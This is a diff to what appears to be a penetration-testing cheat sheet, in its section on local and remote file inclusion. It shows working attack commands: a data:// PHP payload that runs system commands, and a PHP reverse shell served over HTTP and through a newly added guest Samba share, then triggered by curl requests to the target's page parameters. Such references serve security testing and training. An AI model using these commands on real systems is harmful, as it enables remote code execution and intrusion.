@@ -143,9 +143,19 @@ curl "http://<ip>/index.php?page=data://text/plain,<?php%20echo%20system('uname%
 ### Remote
 
 ```shell
-# serve a PHP reverse shell and set a listener and execute it remotely
+# serve a PHP reverse shell and execute it remotely
 python3 -m http.server 80
 curl http://<url>/index.php?page=http://<local_ip>/shell.php
+
+# create a samba share with a reverse shell
+service smbd start   
+# important to create the share outside user homes
+cd /srv
+mkdir share
+cd share
+sudo net usershare add test (pwd) '' 'Everyone:F' guest_ok=y
+
+curl http://<url>/blog/?lang=\\<local_ip>\test\reverse.php
 ```
 
 ## File Upload
